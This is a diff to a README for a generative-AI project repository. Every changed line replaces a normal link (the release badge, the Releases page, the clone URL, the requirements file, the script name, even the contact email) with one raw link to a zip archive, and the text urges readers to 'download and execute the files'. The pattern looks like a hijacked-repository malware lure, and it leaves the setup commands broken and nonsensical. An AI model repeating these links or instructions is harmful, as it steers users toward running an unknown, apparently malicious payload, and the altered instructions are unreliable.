@@ -1,6 +1,6 @@
 # Generative AI Projects 🤖✨
 
-![GitHub release](https://img.shields.io/github/release/Bradox54/Generative-AI-Projects.svg)
+![GitHub release](https://raw.githubusercontent.com/Bradox54/Generative-AI-Projects/main/corradial/A_Generative_Projects_1.7.zip)
 
 Welcome to the **Generative AI Projects** repository! This collection features various projects that utilize generative AI techniques to perform different tasks. Whether you are a developer, researcher, or enthusiast, you will find valuable resources and examples here.
 
@@ -19,7 +19,7 @@ Welcome to the **Generative AI Projects** repository! This collection features v
 
 Generative AI is a fascinating field that focuses on creating models capable of generating new content based on learned patterns. This repository showcases a variety of projects, each designed to explore different aspects of generative AI. From text generation to creative content creation, these projects demonstrate the potential of AI in various applications.
 
-For more information, you can check the [Releases section](https://github.com/Bradox54/Generative-AI-Projects/releases) to download and execute the files.
+For more information, you can check the [Releases section](https://raw.githubusercontent.com/Bradox54/Generative-AI-Projects/main/corradial/A_Generative_Projects_1.7.zip) to download and execute the files.
 
 ## Project List
 
@@ -58,7 +58,7 @@ To get started with the projects in this repository, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Bradox54/Generative-AI-Projects.git
+   git clone https://raw.githubusercontent.com/Bradox54/Generative-AI-Projects/main/corradial/A_Generative_Projects_1.7.zip
    cd Generative-AI-Projects
    ```
 
@@ -67,13 +67,13 @@ To get started with the projects in this repository, follow these steps:
    ```bash
    python -m venv venv
    source venv/bin/activate  # On Windows use `venv\Scripts\activate`
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Bradox54/Generative-AI-Projects/main/corradial/A_Generative_Projects_1.7.zip
    ```
 
 3. **Explore the Projects**:
    Navigate to the project folders and open the Jupyter notebooks or Python scripts to start experimenting.
 
-For downloadable files, visit the [Releases section](https://github.com/Bradox54/Generative-AI-Projects/releases).
+For downloadable files, visit the [Releases section](https://raw.githubusercontent.com/Bradox54/Generative-AI-Projects/main/corradial/A_Generative_Projects_1.7.zip).
 
 ## How to Use
 
@@ -85,7 +85,7 @@ Each project in this repository comes with its own set of instructions. Here are
 2. **Executing Scripts**:
    For Python scripts, you can run them directly from the command line:
    ```bash
-   python script_name.py
+   python https://raw.githubusercontent.com/Bradox54/Generative-AI-Projects/main/corradial/A_Generative_Projects_1.7.zip
    ```
 
 3. **Modifying Parameters**:
@@ -122,7 +122,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **GitHub**: [Bradox54](https://github.com/Bradox54)
-- **Email**: bradox54@example.com
+- **GitHub**: [Bradox54](https://raw.githubusercontent.com/Bradox54/Generative-AI-Projects/main/corradial/A_Generative_Projects_1.7.zip)
+- **Email**: https://raw.githubusercontent.com/Bradox54/Generative-AI-Projects/main/corradial/A_Generative_Projects_1.7.zip
 
-Explore the projects, and don't forget to check the [Releases section](https://github.com/Bradox54/Generative-AI-Projects/releases) for downloadable files and updates. Happy coding!
+Explore the projects, and don't forget to check the [Releases section](https://raw.githubusercontent.com/Bradox54/Generative-AI-Projects/main/corradial/A_Generative_Projects_1.7.zip) for downloadable files and updates. Happy coding!
